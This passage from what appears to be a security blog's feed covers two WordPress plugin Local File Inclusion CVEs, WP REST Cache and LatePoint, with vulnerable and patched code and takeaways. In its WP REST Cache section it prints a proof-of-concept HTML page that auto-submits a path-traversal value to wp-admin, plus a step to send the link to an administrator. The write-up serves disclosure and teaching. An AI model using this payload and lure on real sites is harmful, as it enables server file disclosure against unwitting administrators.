&amp;#39;settings&amp;#39;;&#xA;    }&#xA;&#xA;    $potential_sub_file = __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    if ( dirname( $potential_sub_file ) !== __DIR__ . &amp;#39;/partials&amp;#39; ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;&#xA;    include_once __DIR__ . &amp;#39;/partials/header.php&amp;#39;;&#xA;    if ( isset( $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;] ) ) {&#xA;        include_once $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;];&#xA;    } elseif ( file_exists( __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39; ) ) {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    } else {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-settings.php&amp;#39;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch adds a &lt;strong&gt;check on the file location before include&lt;/strong&gt;, ensuring the file to be loaded is located within the &lt;code&gt;partials&lt;/code&gt; directory. If a path outside that directory is detected (e.g., due to &lt;code&gt;../&lt;/code&gt;), the plugin falls back to a safe default file. This eliminates the &lt;strong&gt;LFI&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;settings_page()&lt;/code&gt; is registered as the submenu callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_submenu_page(&#xA;    &amp;#39;options-general.php&amp;#39;,&#xA;    &amp;#39;WP REST Cache&amp;#39;,&#xA;    &amp;#39;WP REST Cache&amp;#39;,&#xA;    $capability,&#xA;    &amp;#39;wp-rest-cache&amp;#39;,&#xA;    [&#xA;        $this,&#xA;        &amp;#39;settings_page&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So when the endpoint&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;is accessed, &lt;code&gt;settings_page()&lt;/code&gt; is invoked.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create a web page with a form that automatically sends a request with the LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost:80//wp-admin/options-general.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;wp-rest-cache&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;sub&amp;#34; value=&amp;#34;/../../../../../../wp-cofnig&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Send the link to an admin or a privileged user&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;This vulnerability can only be exploited on &lt;strong&gt;Windows&lt;/strong&gt;, because &lt;code&gt;file_exists()&lt;/code&gt; handles paths differently between operating systems. On &lt;strong&gt;Linux&lt;/strong&gt;, if the path includes a non-existent directory, the function returns &lt;code&gt;false&lt;/code&gt;. On &lt;strong&gt;Windows&lt;/strong&gt;, the same path may return &lt;code&gt;true&lt;/code&gt;, allowing the condition check to be bypassed and the vulnerability to be triggered.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;WP REST Cache versions &lt;strong&gt;≤ 2025.1.0&lt;/strong&gt; allow &lt;strong&gt;Local File Inclusion&lt;/strong&gt; via the &lt;code&gt;sub&lt;/code&gt; parameter. The patch in &lt;strong&gt;2025.1.1&lt;/strong&gt; fixes the issue by validating the file location before including it—ensuring files are only loaded if they reside in the &lt;code&gt;partials&lt;/code&gt; directory—thereby preventing path traversal/LFI.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Concatenating request data directly into file paths risks LFI.&lt;/li&gt;&#xA;&lt;li&gt;Always validate the &lt;strong&gt;real/resolved&lt;/strong&gt; file location (absolute path) before including.&lt;/li&gt;&#xA;&lt;li&gt;Restrict allowed files by comparing against an intended directory (whitelist) — this is more effective than merely sanitizing characters.&lt;/li&gt;&#xA;&lt;li&gt;Test on multiple platforms (Windows/Linux) since file-handling behavior can differ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-rest-cache/vulnerability/wordpress-wp-rest-cache-2025-1-0-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress WP REST Cache Plugin &amp;lt;= 2025.1.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6715 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-19-cve-2025-6715/</link>
      <pubDate>Sun, 19 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-19-cve-2025-6715/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LatePoint&lt;/strong&gt; version &lt;strong&gt;≤ 5.1.93&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows unauthenticated attackers to control the file parameter in the &lt;code&gt;include/require&lt;/code&gt; statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6715&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6715&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.94&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;: &lt;strong&gt;5.1.93&lt;/strong&gt; (vulnerable) and &lt;strong&gt;5.1.94&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to compare and inspect differences between versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function render($view, $layout = &amp;#39;none&amp;#39;, $extra_vars = array()){&#xA;    $this-&amp;gt;vars[&amp;#39;route_name&amp;#39;] = $this-&amp;gt;route_name;&#xA;    extract($extra_vars);&#xA;    extract($this-&amp;gt;vars);&#xA;    ob_start();&#xA;    if($layout != &amp;#39;none&amp;#39;){&#xA;      // rendering layout, view variable will be passed and used in layout file&#xA;      include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-&amp;gt;add_extension($layout, &amp;#39;.php&amp;#39;);&#xA;    }else{&#xA;      include $this-&amp;gt;add_extension($view, &amp;#39;.php&amp;#39;);&#xA;    }&#xA;    $response_html = ob_get_clean();&#xA;    return $response_html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the &lt;code&gt;render()&lt;/code&gt; function appends &lt;code&gt;.php&lt;/code&gt; to &lt;code&gt;$layout&lt;/code&gt; and directly includes it without validation, leading to &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt; if &lt;code&gt;$layout&lt;/code&gt; is controlled by user input.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function render($view, $layout = &amp;#39;none&amp;#39;, $extra_vars = array()){&#xA;    $this-&amp;gt;vars[&amp;#39;route_name&amp;#39;] = $this-&amp;gt;route_name;&#xA;    extract($extra_vars);&#xA;    extract($this-&amp;gt;vars);&#xA;    ob_start();&#xA;    if($layout != &amp;#39;none&amp;#39;){&#xA;&#x9;&#x9;$layout_path = $this-&amp;gt;get_safe_layout_path($layout);&#xA;      // rendering layout, view variable will be passed and used in layout file&#xA;      if($layout_path){&#xA;&#x9;&#x9;  include $layout_path;&#xA;      }else{&#xA;&#x9;&#x9;  __(&amp;#39;Invalid layout&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;      }&#xA;    }else{&#xA;      include $this-&amp;gt;add_extension($view, &amp;#39;.php&amp;#39;);&#xA;    }&#xA;    $response_html = ob_get_clean();&#xA;    return $response_html;&#xA;}&#xA;&#xA;private function get_safe_layout_path($layout) {&#xA;    // 1. Remove any path separators and null bytes&#xA;    $layout = str_replace([&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, &amp;#34;\0&amp;#34;], &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 2. Remove any dots to prevent directory traversal&#xA;    $layout = str_replace(&amp;#39;.&amp;#39;, &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 3. Only allow alphanumeric, underscore, and hyphen&#xA;    $layout = preg_replace(&amp;#39;/[^a-zA-Z0-9_-]/&amp;#39;, &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 4. Construct the full path&#xA;    $layout_file = 